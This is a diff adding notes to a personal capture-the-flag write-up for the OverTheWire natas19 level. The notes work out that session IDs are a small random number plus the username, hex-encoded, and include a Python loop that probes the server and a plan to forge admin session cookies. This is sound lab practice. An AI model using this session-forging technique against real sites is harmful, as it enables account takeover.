@@ -78,3 +78,20 @@ ba      --> 361-ba
 
 it adds username as the password if one isn't supplied...let's see if this works.
 it did not.
+
+after doing some more recon, it looks like the sessions is actually a random integer btwn 1 - 641, followed by the username, hex encoded
+for test in tests:
+    for id in ids:
+        url = 'http://natas19.natas.labs.overthewire.org/index.php?username={}&password={}'.format(id, test)
+        r = requests.post(url, headers=headers)
+        print(test+'\t--> '+bytes.fromhex(r.cookies['PHPSESSID']).decode('ascii'))
+test            id (as decoded from PHPSESSID)
+a       --> 285-1
+a       --> 377-2
+a       --> 463-3
+a       --> 317-4
+a       --> 121-5
+a       --> 96-6
+a       --> 259-7
+
+let's try '{}-admin'.format(i).encode().hex()
